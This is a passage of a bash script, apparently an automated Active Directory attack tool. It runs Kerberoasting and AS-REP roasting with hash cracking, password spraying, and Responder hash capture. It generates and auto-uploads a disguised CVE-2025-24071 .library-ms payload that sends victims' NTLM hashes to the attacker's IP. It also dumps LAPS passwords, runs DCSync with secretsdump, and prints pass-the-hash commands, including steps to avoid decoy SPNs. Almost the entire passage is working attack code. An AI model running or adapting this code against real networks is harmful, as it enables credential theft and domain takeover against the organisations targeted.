            python3 "$TGSREPCRACK" "$PASSLIST" "$OUTDIR/hashes/kerb_rc4.txt" \
                2>/dev/null | tee "$OUTDIR/kerberos/advanced/tgsrepcrack_results.txt"
            grep -i "found\|password\|cracked" "$OUTDIR/kerberos/advanced/tgsrepcrack_results.txt" 2>/dev/null | \
                while read -r line; do crit "★ tgsrepcrack: $line"; done
        elif [[ -z "$TGSREPCRACK" ]]; then
            warn "tgsrepcrack.py not found. Install: git clone https://github.com/nidem/kerberoast /opt/kerberoast"
        fi
    fi

    # ── 6b-10: AS-REP Roasting with etype analysis ────────────────────────────
    sep; info "★ AS-REP Roasting — multi-etype (RC4 + AES downgrade check)..."

    # Detect accounts with pre-auth disabled via LDAP
    if [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]]; then
        ldapsearch -x -H "ldap://$TARGET" \
            -D "$DUMP_USER@$DOMAIN" -w "$DUMP_PASS" \
            -b "$DOMAIN_DN" \
            "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
            sAMAccountName msDS-SupportedEncryptionTypes userAccountControl \
            2>/dev/null | tee "$OUTDIR/kerberos/advanced/asrep_eligible.txt"
        ASREP_COUNT=$(grep -c "sAMAccountName:" "$OUTDIR/kerberos/advanced/asrep_eligible.txt" 2>/dev/null || echo 0)
        if [[ "$ASREP_COUNT" -gt 0 ]]; then
            crit "★ AS-REP ELIGIBLE ACCOUNTS (DONT_REQ_PREAUTH): $ASREP_COUNT"
            grep "sAMAccountName:" "$OUTDIR/kerberos/advanced/asrep_eligible.txt" | awk '{print $2}'
        fi
    fi

    # AS-REP with discovered userlist
    ATTACK_USERS_ASREP="$USERS_FILE"; [[ -s "$VALID_USERS" ]] && ATTACK_USERS_ASREP="$VALID_USERS"
    if [[ -s "$ATTACK_USERS_ASREP" ]]; then
        info "AS-REP Roasting with $(wc -l < "$ATTACK_USERS_ASREP") users..."
        impacket-GetNPUsers "$DOMAIN/" -dc-ip "$TARGET" -no-pass \
            -usersfile "$ATTACK_USERS_ASREP" -format hashcat \
            -outputfile "$OUTDIR/hashes/asrep.txt" 2>&1 | tee "$OUTDIR/hashes/asrep_stdout.txt"
    fi

    # AS-REP with auth (auto-discovers all DONT_REQ_PREAUTH accounts)
    if [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]]; then
        impacket-GetNPUsers "$DOMAIN/$DUMP_USER:$DUMP_PASS" -dc-ip "$TARGET" \
            -request -format hashcat \
            -outputfile "$OUTDIR/hashes/asrep_auto.txt" 2>&1 | tee -a "$OUTDIR/hashes/asrep_stdout.txt"
    elif [[ -n "$DUMP_USER" && -n "$DUMP_HASH" ]]; then
        impacket-GetNPUsers "$DOMAIN/$DUMP_USER" -dc-ip "$TARGET" -hashes "$DUMP_HASH" \
            -request -format hashcat \
            -outputfile "$OUTDIR/hashes/asrep_auto.txt" 2>&1 | tee -a "$OUTDIR/hashes/asrep_stdout.txt"
    fi

    # netexec AS-REP roasting
    if command -v netexec &>/dev/null && [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]]; then
        netexec ldap "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" \
            --asreproast "$OUTDIR/kerberos/advanced/nxc_asrep.txt" \
            2>/dev/null | tee "$OUTDIR/kerberos/advanced/nxc_asrep_stdout.txt"
        [[ -s "$OUTDIR/kerberos/advanced/nxc_asrep.txt" ]] && \
            crit "★ netexec AS-REP hashes: $OUTDIR/kerberos/advanced/nxc_asrep.txt"
    fi

    # Collect all AS-REP hashes
    ASREP=$(cat "$OUTDIR/hashes/asrep.txt" "$OUTDIR/hashes/asrep_auto.txt" \
             "$OUTDIR/kerberos/advanced/nxc_asrep.txt" 2>/dev/null | \
             grep '\$krb5asrep\$' | sort -u)

    if [[ -n "$ASREP" ]]; then
        crit "★ AS-REP HASHES: $(echo "$ASREP" | wc -l)"
        echo "$ASREP" | tee "$OUTDIR/hashes/asrep_all.txt" | while read -r h; do
            U=$(echo "$h" | grep -oP '\$krb5asrep\$\d+\$\K[^@:]+')
            ETYPE_A=$(echo "$h" | grep -oP '\$krb5asrep\$\K\d+')
            ETYPE_NAME="RC4"; [[ "$ETYPE_A" == "18" ]] && ETYPE_NAME="AES256"; [[ "$ETYPE_A" == "17" ]] && ETYPE_NAME="AES128"
            save_hash "ASREP|$U|$h"
            echo -e "  ${YEL}$U${RST} ${DIM}[etype=$ETYPE_A/$ETYPE_NAME]${RST}"
        done

        # Multi-mode AS-REP cracking
        grep '\$krb5asrep\$23\$' "$OUTDIR/hashes/asrep_all.txt" 2>/dev/null > "$OUTDIR/hashes/asrep_rc4.txt"
        grep '\$krb5asrep\$18\$' "$OUTDIR/hashes/asrep_all.txt" 2>/dev/null > "$OUTDIR/hashes/asrep_aes256.txt"
        grep '\$krb5asrep\$17\$' "$OUTDIR/hashes/asrep_all.txt" 2>/dev/null > "$OUTDIR/hashes/asrep_aes128.txt"

        if command -v hashcat &>/dev/null && [[ -f "$PASSLIST" ]]; then
            # RC4 AS-REP (mode 18200)
            [[ -s "$OUTDIR/hashes/asrep_rc4.txt" ]] && {
                info "  hashcat AS-REP RC4 (18200) — wordlist + best64 rules..."
                timeout 180 hashcat -m 18200 -a 0 "$OUTDIR/hashes/asrep_rc4.txt" \
                    "$PASSLIST" --force --quiet 2>/dev/null
                for rule in /usr/share/hashcat/rules/best64.rule /usr/share/hashcat/rules/dive.rule; do
                    [[ -f "$rule" ]] && timeout 90 hashcat -m 18200 -a 0 \
                        "$OUTDIR/hashes/asrep_rc4.txt" "$PASSLIST" -r "$rule" \
                        --force --quiet 2>/dev/null
                done
                hashcat -m 18200 "$OUTDIR/hashes/asrep_rc4.txt" --show 2>/dev/null | \
                    while IFS=: read -r hash pass; do
                    U=$(echo "$hash" | grep -oP '\$krb5asrep\$\d+\$\K[^@:]+')
                    [[ -n "$U" && -n "$pass" ]] && { save_cred "$U" "$pass"; crit "★ CRACKED AS-REP: $U → $pass"; }
                done
            }
            # AES256 AS-REP (mode 19900)
            [[ -s "$OUTDIR/hashes/asrep_aes256.txt" ]] && {
                info "  hashcat AS-REP AES256 (19900)..."
                timeout 120 hashcat -m 19900 -a 0 "$OUTDIR/hashes/asrep_aes256.txt" \
                    "$PASSLIST" --force --quiet 2>/dev/null
                hashcat -m 19900 "$OUTDIR/hashes/asrep_aes256.txt" --show 2>/dev/null | \
                    while IFS=: read -r hash pass; do
                    U=$(echo "$hash" | grep -oP '\$krb5asrep\$\d+\$\K[^@:]+')
                    [[ -n "$U" && -n "$pass" ]] && { save_cred "$U" "$pass"; crit "★ CRACKED AES256 AS-REP: $U → $pass"; }
                done
            }
        fi

        # john AS-REP
        if command -v john &>/dev/null && [[ -f "$PASSLIST" && -s "$OUTDIR/hashes/asrep_rc4.txt" ]]; then
            info "  john AS-REP (krb5asrep)..."
            john --wordlist="$PASSLIST" --format=krb5asrep "$OUTDIR/hashes/asrep_rc4.txt" 2>/dev/null
            john --show --format=krb5asrep "$OUTDIR/hashes/asrep_rc4.txt" 2>/dev/null | \
                grep ':' | while IFS=: read -r u p rest; do
                [[ -n "$u" && -n "$p" && "$p" != "0 password" ]] && save_cred "$u" "$p"
            done
        fi
    fi

    # ── 6b-11: Honeytoken / Decoy SPN Detection ───────────────────────────────
    sep; info "★ Honeytoken / Decoy SPN Detection (OPSEC)..."
    # Deceptive SPNs often have names like 'honeypot', 'decoy', 'canary', 'trap'
    # or are high-value names with no real service (e.g. fake admin accounts with SPNs)
    if [[ -f "$OUTDIR/kerberos/advanced/spn_ldap_full.txt" ]]; then
        DECOY_SPNS=$(grep -i "servicePrincipalName:" "$OUTDIR/kerberos/advanced/spn_ldap_full.txt" 2>/dev/null | \
            grep -iE "honey|decoy|canary|trap|alert|monitor|watchdog|sensor" | \
            awk '{print $2}')
        if [[ -n "$DECOY_SPNS" ]]; then
            warn "★ POSSIBLE HONEYPOT/DECOY SPNs DETECTED (DO NOT ROAST THESE):"
            echo "$DECOY_SPNS" | while read -r dspn; do warn "  → $dspn"; done
        else
            ok "No obvious honeypot SPNs detected"
        fi

        # Also flag SPN accounts with unusual pwdLastSet (e.g., very old) — may be canaries
        info "Checking for SPN accounts with old passwords (>365 days) — cracking priority..."
        ldapsearch -x -H "ldap://$TARGET" \
            -D "${DUMP_USER:-}@$DOMAIN" -w "${DUMP_PASS:-}" \
            -b "$DOMAIN_DN" \
            "(&(objectClass=user)(servicePrincipalName=*))" \
            sAMAccountName pwdLastSet 2>/dev/null | \
            awk '/sAMAccountName:/{u=$2} /pwdLastSet:/{p=$2; if(p && p+0 > 0){
                ts=int((p - 116444736000000000) / 10000000);
                age=int((systime() - ts) / 86400);
                if(age > 365) printf "  AGE=%d days: %s\n", age, u
            }}' 2>/dev/null | while read -r line; do
            crit "★ OLD-PASSWORD SPN (stale svc account — easy crack?): $line"
        done
    fi

    # ── 6b-12: PKINIT / Kerberos Pre-auth Bypass Check ───────────────────────
    sep; info "★ PKINIT check (certificate-based pre-auth bypass)..."
    if command -v certipy-ad &>/dev/null && [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]]; then
        # Check if any cert templates allow SAN specification (can forge pre-auth)
        PKINIT_TEMPLATES=$(grep -i "pkinit\|smart.card\|SmartCard\|ClientAuth" \
            "$OUTDIR/certs/certipy_vuln.txt" 2>/dev/null | head -10)
        if [[ -n "$PKINIT_TEMPLATES" ]]; then
            crit "★ PKINIT-capable templates found — Kerberos pre-auth via cert possible!"
            warn "  Request cert: certipy-ad req -u $DUMP_USER@$DOMAIN -p '$DUMP_PASS' -ca <CA> -template <TPL> -dc-ip $TARGET"
            warn "  Use for AS-REP bypass: certipy-ad auth -pfx <cert.pfx> -domain $DOMAIN -dc-ip $TARGET"
        fi
    fi

    # ── 6b-13: Kerberoasting Summary ─────────────────────────────────────────
    sep
    TOTAL_TGS=$(cat "$OUTDIR/hashes/kerb_all.txt" 2>/dev/null | grep -c '\$krb5tgs\$' || echo 0)
    TOTAL_ASREP=$(cat "$OUTDIR/hashes/asrep_all.txt" 2>/dev/null | grep -c '\$krb5asrep\$' || echo 0)
    TOTAL_CRACKED_TGS=$(hashcat -m 13100 "$OUTDIR/hashes/kerb_rc4.txt" --show 2>/dev/null | grep -c '.' || echo 0)
    TOTAL_CRACKED_ASREP=$(hashcat -m 18200 "$OUTDIR/hashes/asrep_rc4.txt" --show 2>/dev/null | grep -c '.' || echo 0)
    echo -e "\n${RED}${BOLD}┌─── ★ KERBEROASTING SUMMARY ─────────────────────────────────────┐${RST}"
    printf "${RED}${BOLD}│${RST}  TGS hashes        : ${YEL}%-48s${RST}${RED}${BOLD}│${RST}\n" "$TOTAL_TGS total (RC4=$RC4_TICKETS AES256=$AES256_TICKETS AES128=$AES128_TICKETS)"
    printf "${RED}${BOLD}│${RST}  AS-REP hashes     : ${YEL}%-48s${RST}${RED}${BOLD}│${RST}\n" "$TOTAL_ASREP"
    printf "${RED}${BOLD}│${RST}  TGS cracked       : ${GRN}%-48s${RST}${RED}${BOLD}│${RST}\n" "$TOTAL_CRACKED_TGS"
    printf "${RED}${BOLD}│${RST}  AS-REP cracked    : ${GRN}%-48s${RST}${RED}${BOLD}│${RST}\n" "$TOTAL_CRACKED_ASREP"
    printf "${RED}${BOLD}│${RST}  RC4-only accounts : ${CYN}%-48s${RST}${RED}${BOLD}│${RST}\n" "$RC4_COUNT (fastest to crack)"
    echo -e "${RED}${BOLD}└────────────────────────────────────────────────────────────────────┘${RST}\n"

    warn "★ Manual cracking reference:"
    warn "  TGS RC4    : hashcat -m 13100 kerb_rc4.txt wordlist.txt -r best64.rule"
    warn "  TGS AES256 : hashcat -m 19700 kerb_aes256.txt wordlist.txt"
    warn "  TGS AES128 : hashcat -m 19600 kerb_aes128.txt wordlist.txt"
    warn "  AS-REP RC4 : hashcat -m 18200 asrep_rc4.txt wordlist.txt -r best64.rule"
    warn "  AS-REP AES : hashcat -m 19900 asrep_aes256.txt wordlist.txt"
    warn "  TGS john   : john --format=krb5tgs --wordlist=wordlist.txt kerb_rc4.txt"
    warn "  ASREP john : john --format=krb5asrep --wordlist=wordlist.txt asrep_rc4.txt"
    warn "  tgscrack   : python3 tgsrepcrack.py wordlist.txt <ticket.bin>"
fi



# ── 6c: Password Spraying (Advanced) ──
sep; info "★ Password Spraying..."
if [[ -s "$ATTACK_USERS" ]] && command -v netexec &>/dev/null && [[ -n "$DOMAIN" ]]; then
    # First: Check password policy
    info "Checking password policy before spray..."
    netexec smb "$TARGET" -u '' -p '' --pass-pol 2>/dev/null | tee "$OUTDIR/passwords/policy.txt"
    
    # 1. Username-as-password spray
    info "Username-as-password spray..."
    netexec smb "$TARGET" -u "$ATTACK_USERS" -p "$ATTACK_USERS" --continue-on-success --no-bruteforce 2>/dev/null | tee -a "$OUTDIR/passwords/spray.txt"
    parse_nxc_output "$OUTDIR/passwords/spray.txt" ""

    # 2. Common AD mutations
    info "Password mutations spray..."
    MUTATIONS_FILE=$(mktemp)
    YEAR=$(date +%Y)
    printf '%s\n' "Password123" "P@ssword123" "Welcome123!" "Spring$YEAR" "Summer$YEAR" "Fall$YEAR" "Winter$YEAR" "August$YEAR" "${DOMAIN%%.*}123" > "$MUTATIONS_FILE"
    netexec smb "$TARGET" -u "$ATTACK_USERS" -p "$MUTATIONS_FILE" --continue-on-success 2>/dev/null | tee -a "$OUTDIR/passwords/spray_mutations.txt"
    parse_nxc_output "$OUTDIR/passwords/spray_mutations.txt" ""
    rm -f "$MUTATIONS_FILE"

    # 3. Default list spray
    SPRAY_N=0
    while IFS= read -r pass && [[ $SPRAY_N -lt 5 ]]; do
        info "Spray: $pass"
        OUT_F="$OUTDIR/passwords/spray_$SPRAY_N.txt"
        netexec smb "$TARGET" -u "$ATTACK_USERS" -p "$pass" --continue-on-success 2>/dev/null | tee "$OUT_F"
        parse_nxc_output "$OUT_F" "$pass"
        SPRAY_N=$((SPRAY_N+1)); sleep 2
    done < "$PASSLIST"
fi

# ★ LLMNR / NBT-NS POISONING (DC03/HackMyVM technique)
# Even when SMB signing is required (blocks relay), Responder can still capture NTLMv2 hashes
# This runs in the background for a limited window, then parses captured hashes
sep; info "★ LLMNR/NBT-NS Poisoning — NTLMv2 Hash Capture (Responder)..."
if command -v responder &>/dev/null; then
    # Detect the primary network interface
    PRIMARY_IFACE=$(ip route get 8.8.8.8 2>/dev/null | grep -oP 'dev \K\S+' | head -1)
    [[ -z "$PRIMARY_IFACE" ]] && PRIMARY_IFACE=$(ip link | grep -v "lo:" | grep "state UP" | awk -F: '{print $2}' | tr -d ' ' | head -1)
    [[ -z "$PRIMARY_IFACE" ]] && PRIMARY_IFACE="eth0"

    RESPONDER_LOG="/var/log/responder/Responder-Session.log"
    RESPONDER_HASHES_DIR="/usr/share/responder/logs"

    info "Starting Responder on $PRIMARY_IFACE for 60 seconds (background)..."
    info "Listening for LLMNR/NBT-NS/mDNS broadcast queries..."
    timeout 60 responder -I "$PRIMARY_IFACE" -dw --lm -v 2>/dev/null | tee "$OUTDIR/misc/responder_capture.txt" &
    RESP_PID=$!

    # Wait for capture window
    sleep 62
    kill "$RESP_PID" 2>/dev/null
    wait "$RESP_PID" 2>/dev/null

    # Parse captured NTLMv2 hashes from Responder logs
    info "★ Parsing Responder captured hashes..."
    for log_dir in "/usr/share/responder/logs" "/opt/responder/logs" "/tmp/responder/logs"; do
        [[ -d "$log_dir" ]] || continue
        find "$log_dir" -name "*.txt" -newer /tmp 2>/dev/null | while read -r logf; do
            if grep -q "NTLMv2" "$logf" 2>/dev/null || grep -q "SMB-NTLMv2" "$logf" 2>/dev/null; then
                cp "$logf" "$OUTDIR/hashes/"
                crit "★ NTLM HASH FILE: $(basename "$logf")"
            fi
        done
        # Find NetNTLMv2 hashes directly (format: user::domain:challenge:...)
        find "$log_dir" -name "*NTLMv2*" -o -name "*HTTP*" -o -name "*SMB*" 2>/dev/null | while read -r hashf; do
            [[ -f "$hashf" ]] || continue
            while IFS= read -r line; do
                if echo "$line" | grep -qP '^[^:]+::[^:]+:[0-9a-fA-F]+:[0-9a-fA-F]+:'; then
                    HASH_USER=$(echo "$line" | cut -d: -f1)
                    crit "★ NTLMv2 HASH CAPTURED: $HASH_USER"
                    cp "$hashf" "$OUTDIR/hashes/responder_$(basename "$hashf")"
                    save_hash "NTLMv2|$line"
                    # Auto-crack with hashcat and john
                    echo "$line" > "$OUTDIR/hashes/ntlmv2_${HASH_USER}.txt"
                    if command -v john &>/dev/null && [[ -f "$PASSLIST" ]]; then
                        info "Auto-cracking NTLMv2 with john..."
                        john --wordlist="$PASSLIST" --format=netntlmv2 \
                            "$OUTDIR/hashes/ntlmv2_${HASH_USER}.txt" 2>/dev/null
                        john --show --format=netntlmv2 \
                            "$OUTDIR/hashes/ntlmv2_${HASH_USER}.txt" 2>/dev/null | \
                            grep -oP '^[^:]+:\K[^:]+' | while read -r cracked; do
                            save_cred "$HASH_USER" "$cracked"
                        done
                    fi
                    if command -v hashcat &>/dev/null && [[ -f "$PASSLIST" ]]; then
                        info "Auto-cracking NTLMv2 with hashcat..."
                        timeout 120 hashcat -m 5600 -a 0 \
                            "$OUTDIR/hashes/ntlmv2_${HASH_USER}.txt" "$PASSLIST" \
                            --force --quiet 2>/dev/null
                        hashcat -m 5600 "$OUTDIR/hashes/ntlmv2_${HASH_USER}.txt" --show 2>/dev/null | \
                            while IFS=: read -r h p; do
                            CRACKED_U=$(echo "$h" | cut -d: -f1)
                            [[ -n "$CRACKED_U" && -n "$p" ]] && save_cred "$CRACKED_U" "$p"
                        done
                    fi
                fi
            done < "$hashf"
        done
    done

    # Also check the output we captured directly
    grep -oP '^[A-Za-z0-9_.-]+::[A-Za-z0-9_.-]+:[0-9a-fA-F]{16}:[0-9a-fA-F]+:[0-9a-fA-F]+' \
        "$OUTDIR/misc/responder_capture.txt" 2>/dev/null | while read -r ntlmv2; do
        HASH_USER=$(echo "$ntlmv2" | cut -d: -f1)
        crit "★ NTLMv2 CAPTURED FROM RESPONDER: $HASH_USER"
        echo "$ntlmv2" > "$OUTDIR/hashes/ntlmv2_${HASH_USER}_captured.txt"
        save_hash "NTLMv2|$ntlmv2"
        command -v hashcat &>/dev/null && [[ -f "$PASSLIST" ]] && {
            timeout 120 hashcat -m 5600 -a 0 \
                "$OUTDIR/hashes/ntlmv2_${HASH_USER}_captured.txt" "$PASSLIST" --force --quiet 2>/dev/null
            hashcat -m 5600 "$OUTDIR/hashes/ntlmv2_${HASH_USER}_captured.txt" --show 2>/dev/null | \
                while IFS=: read -r h p; do
                u=$(echo "$h" | cut -d: -f1); [[ -n "$u" && -n "$p" ]] && save_cred "$u" "$p"
            done
        }
    done
else
    warn "Responder not installed. To capture LLMNR/NBT-NS hashes: apt install responder"
    warn "Manual: sudo responder -I <IFACE> -dw --lm -v"
    warn "Then crack: hashcat -m 5600 hash.txt rockyou.txt"
fi

# ── Re-run Authenticated Enumeration if credentials found ──
get_best_cred
if [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]]; then
    phase "6 EXTRA — AUTHENTICATED RE-ENUMERATION"
    info "New credentials found! Re-running sensitive enumeration as $DUMP_USER..."
    
    # Re-run LDAP with auth
    LU="ldap://$TARGET"
    info "Re-running LDAP dump with auth..."
    ldapdomaindump "$LU" -u "$DOMAIN\\$DUMP_USER" -p "$DUMP_PASS" -o "$OUTDIR/ldap/dump_auth" 2>/dev/null
    
    # Check LAPS again with auth
    info "Checking LAPS with auth..."
    ldapsearch -x -H "$LU" -D "$DUMP_USER@$DOMAIN" -w "$DUMP_PASS" -b "$DOMAIN_DN" "(objectClass=computer)" ms-Mcs-AdmPwd ms-LAPS-Password cn 2>/dev/null >> "$OUTDIR/ldap/laps_auth.txt"
    grep -E "(ms-Mcs-AdmPwd|ms-LAPS-Password):" "$OUTDIR/ldap/laps_auth.txt" 2>/dev/null | while read -r line; do
        crit "★ LAPS PASSWORD FOUND: $line"
        save_hash "LAPS|$line"
    done

    # Re-run SMB share enum with auth
    info "Re-running SMB share enum with auth..."
    netexec smb "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" --shares 2>/dev/null | tee "$OUTDIR/smb/shares_auth.txt"

    # ★ CVE-2025-24071 — .library-ms NTLM hash capture (HTB: Fluffy technique)
    # Upload malicious ZIP to any writable SMB share to steal NTLMv2 hashes
    sep; info "★ Checking for writable shares for CVE-2025-24071 (.library-ms) attack..."
    ATTACKER_IP=$(ip route get 8.8.8.8 2>/dev/null | grep -oP 'src \K\S+' | head -1)
    [[ -z "$ATTACKER_IP" ]] && ATTACKER_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
    WRITABLE_SHARES=$(grep -E "WRITE" "$OUTDIR/smb/shares_auth.txt" 2>/dev/null | awk '{print $4}')
    if [[ -n "$WRITABLE_SHARES" && -n "$ATTACKER_IP" ]]; then
        PAYLOAD_DIR="$OUTDIR/misc/cve_2025_24071"
        mkdir -p "$PAYLOAD_DIR"
        PAYLOAD_NAME="Update_Notice_$(date +%Y%m%d)"
        # Generate malicious .library-ms XML (triggers SMB auth when ZIP extracted on Windows)
        cat > "$PAYLOAD_DIR/${PAYLOAD_NAME}.library-ms" << 'LIBEOF'
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
LIBEOF
        echo "        <url>\\\\${ATTACKER_IP}\\shared</url>" >> "$PAYLOAD_DIR/${PAYLOAD_NAME}.library-ms"
        cat >> "$PAYLOAD_DIR/${PAYLOAD_NAME}.library-ms" << 'LIBEOF2'
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
LIBEOF2
        # Fix the template substitution
        sed -i "s|\\\\\\\\\\${ATTACKER_IP}|\\\\\\\\${ATTACKER_IP}|g" \
            "$PAYLOAD_DIR/${PAYLOAD_NAME}.library-ms" 2>/dev/null
        command -v zip &>/dev/null && {
            (cd "$PAYLOAD_DIR" && zip "${PAYLOAD_NAME}.zip" "${PAYLOAD_NAME}.library-ms" 2>/dev/null)
            crit "★ CVE-2025-24071 payload generated: $PAYLOAD_DIR/${PAYLOAD_NAME}.zip"
            crit "  When victim extracts ZIP, their NTLMv2 hash is sent to $ATTACKER_IP"
            warn "  STEP 1: sudo responder -I tun0 -dw --lm -v"
            warn "  STEP 2: Upload to writable share"
            # Auto-upload to first writable share
            FIRST_WRITE=$(echo "$WRITABLE_SHARES" | head -1)
            if [[ -n "$FIRST_WRITE" ]]; then
                info "  Auto-uploading to \\\\${TARGET}\\${FIRST_WRITE}..."
                smbclient "//${TARGET}/${FIRST_WRITE}" -U "${DUMP_USER}%${DUMP_PASS}" \
                    -c "put ${PAYLOAD_DIR}/${PAYLOAD_NAME}.zip ${PAYLOAD_NAME}.zip" 2>/dev/null && \
                    crit "  ★ PAYLOAD UPLOADED to \\\\${TARGET}\\${FIRST_WRITE}\\${PAYLOAD_NAME}.zip"
            fi
        }
    fi

    # ★ Authenticated deep share content download (PDF/Office files may contain CVEs, creds)
    sep; info "★ Downloading non-system share files for analysis..."
    mkdir -p "$OUTDIR/smb/share_files"
    grep -E "READ|WRITE" "$OUTDIR/smb/shares_auth.txt" 2>/dev/null | \
        grep -iv "ADMIN\$\|C\$\|IPC\$\|NETLOGON\|SYSVOL\|print\$" | \
        awk '{print $4}' | while read -r share; do
        [[ -z "$share" ]] && continue
        mkdir -p "$OUTDIR/smb/share_files/$share"
        info "  Downloading from $share..."
        smbclient "//${TARGET}/${share}" -U "${DUMP_USER}%${DUMP_PASS}" \
            -c "recurse ON; prompt OFF; lcd $OUTDIR/smb/share_files/$share; mget *" 2>/dev/null
        # Parse Office/PDF files for metadata/creds
        find "$OUTDIR/smb/share_files/$share" -type f \( -name "*.pdf" -o -name "*.docx" \
            -o -name "*.xlsx" -o -name "*.pptx" -o -name "*.txt" -o -name "*.bat" \
            -o -name "*.ps1" -o -name "*.xml" \) 2>/dev/null | while read -r f; do
            crit "  Downloaded: $f"
            # Check for passwords in text files
            grep -iE "password|passwd|pass=|pwd=|credential|secret" "$f" 2>/dev/null | \
                grep -v "^#\|^\s*//" | head -5 | while read -r line; do
                crit "    ★ POSSIBLE CRED: $line"
            done
            # Extract metadata from PDFs/images
            command -v exiftool &>/dev/null && exiftool "$f" 2>/dev/null | \
                grep -iE "Author|Creator|Producer|Company" | tee -a "$OUTDIR/smb/share_files/metadata.txt"
        done
    done

    # Re-run GPP with auth
    info "Re-checking GPP with auth..."
    for share in Replication SYSVOL NETLOGON; do
        smbclient "//$TARGET/$share" -U "$DUMP_USER%$DUMP_PASS" -c "recurse ON; prompt OFF; lcd $OUTDIR/smb/gpp_files; mget *.xml" 2>/dev/null
    done
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 7 — DCSync + NTDS DUMP + Pass-the-Hash
# ═══════════════════════════════════════════════════════════════════════════════
phase "7 — DCSync & HASH DUMP"
get_best_cred

if [[ -n "$DUMP_USER" && ( -n "$DUMP_PASS" || -n "$DUMP_HASH" ) && -n "$DOMAIN" ]]; then
    # Build auth string
    if [[ -n "$DUMP_HASH" ]]; then
        AUTH_STR="$DOMAIN/$DUMP_USER@$TARGET"
        HASH_ARG="-hashes $DUMP_HASH"
        crit "Using Pass-the-Hash: $DUMP_USER"
    else
        AUTH_STR="$DOMAIN/$DUMP_USER:$DUMP_PASS@$TARGET"
        HASH_ARG=""
        crit "Using creds: $DUMP_USER"
    fi

    # ★ secretsdump — DCSync (HTB: Forest, Administrator)
    info "★ impacket-secretsdump (DCSync)..."
    impacket-secretsdump $AUTH_STR $HASH_ARG -outputfile "$OUTDIR/hashes/secretsdump" 2>/dev/null | tee "$OUTDIR/hashes/secretsdump_stdout.txt"

    # ★ impacket-reg (Remote Registry)
    info "★ impacket-reg (Hives dump)..."
    impacket-reg $AUTH_STR $HASH_ARG save -keyName 'HKLM\SAM' -o "$OUTDIR/hashes/sam.hive" 2>/dev/null
    impacket-reg $AUTH_STR $HASH_ARG save -keyName 'HKLM\SECURITY' -o "$OUTDIR/hashes/security.hive" 2>/dev/null
    impacket-reg $AUTH_STR $HASH_ARG save -keyName 'HKLM\SYSTEM' -o "$OUTDIR/hashes/system.hive" 2>/dev/null

    if [[ -f "$OUTDIR/hashes/secretsdump.ntds" ]]; then
        NTDS_C=$(wc -l < "$OUTDIR/hashes/secretsdump.ntds")
        crit "★★★ NTDS HASHES: $NTDS_C accounts ★★★"
        while IFS=: read -r acct rid lm ntlm rest; do
            [[ -z "$acct" ]] && continue
            save_hash "NTDS|$acct|$ntlm"
            echo -e "  ${RED}$acct : $ntlm${RST}"
        done < "$OUTDIR/hashes/secretsdump.ntds"
    fi
    [[ -f "$OUTDIR/hashes/secretsdump.sam" ]] && {
        crit "★ SAM hashes extracted"
        while IFS=: read -r a r l n rest; do save_hash "SAM|$a|$n"; done < "$OUTDIR/hashes/secretsdump.sam"
    }

    # VSS backup method
    info "★ NTDS via VSS..."
    impacket-secretsdump $AUTH_STR $HASH_ARG -use-vss -outputfile "$OUTDIR/hashes/secretsdump_vss" 2>/dev/null

    # netexec dumps
    if command -v netexec &>/dev/null; then
        NXC_AUTH="-u '$DUMP_USER'"
        [[ -n "$DUMP_HASH" ]] && NXC_AUTH="$NXC_AUTH -H '$DUMP_HASH'" || NXC_AUTH="$NXC_AUTH -p '$DUMP_PASS'"
        for dump_type in --sam --lsa --ntds --dpapi; do
            info "netexec dump: $dump_type"
            eval netexec smb "$TARGET" $NXC_AUTH $dump_type 2>/dev/null | tee "$OUTDIR/hashes/nxc${dump_type//-/_}.txt"
            grep -qi "Pwn3d!" "$OUTDIR/hashes/nxc${dump_type//-/_}.txt" && ok "SUCCESS: Account has administrative rights ($dump_type dump worked)!"
        done
    fi

    # ★ Pass-the-Hash validation for admin
    info "★ Testing Pass-the-Hash for Administrator..."
    ADMIN_HASH=$(grep -i "^Administrator:" "$OUTDIR/hashes/secretsdump.ntds" 2>/dev/null | head -1 | cut -d: -f4)
    if [[ -n "$ADMIN_HASH" ]] && command -v netexec &>/dev/null; then
        PTH_RESULT=$(netexec smb "$TARGET" -u 'Administrator' -H "$ADMIN_HASH" 2>/dev/null)
        echo "$PTH_RESULT" | tee "$OUTDIR/hashes/pth_admin.txt"
        echo "$PTH_RESULT" | grep -qi "Pwn3d" && {
            crit "★★★ ADMIN PASS-THE-HASH WORKS ★★★"
            crit "  netexec smb $TARGET -u Administrator -H $ADMIN_HASH"
            crit "  impacket-psexec $DOMAIN/Administrator@$TARGET -hashes aad3b435b51404eeaad3b435b51404ee:$ADMIN_HASH"
            save_cred "Administrator" "PTH:$ADMIN_HASH"
        }
        # WinRM PtH
        echo "$OPEN_PORTS" | grep -qE "(5985|5986)" && {
            netexec winrm "$TARGET" -u 'Administrator' -H "$ADMIN_HASH" 2>/dev/null | tee "$OUTDIR/hashes/pth_winrm.txt"
            grep -qi "Pwn3d" "$OUTDIR/hashes/pth_winrm.txt" 2>/dev/null && {
                crit "★★★ WinRM PtH WORKS ★★★"
                crit "  evil-winrm -i $TARGET -u Administrator -H $ADMIN_HASH"
            }
        }
    fi

    # ★ BloodHound collection
    command -v bloodhound-python &>/dev/null && {
        info "BloodHound data collection..."
        if [[ -n "$DUMP_PASS" ]]; then
            bloodhound-python -u "$DUMP_USER" -p "$DUMP_PASS" -ns "$TARGET" -d "$DOMAIN" -c All --zip -o "$OUTDIR/bloodhound/" 2>/dev/null
        fi
        ok "BloodHound → $OUTDIR/bloodhound/"
    }

    # ★ RustHound-CE (BloodHound Community Edition collector — HTB: Haze technique)
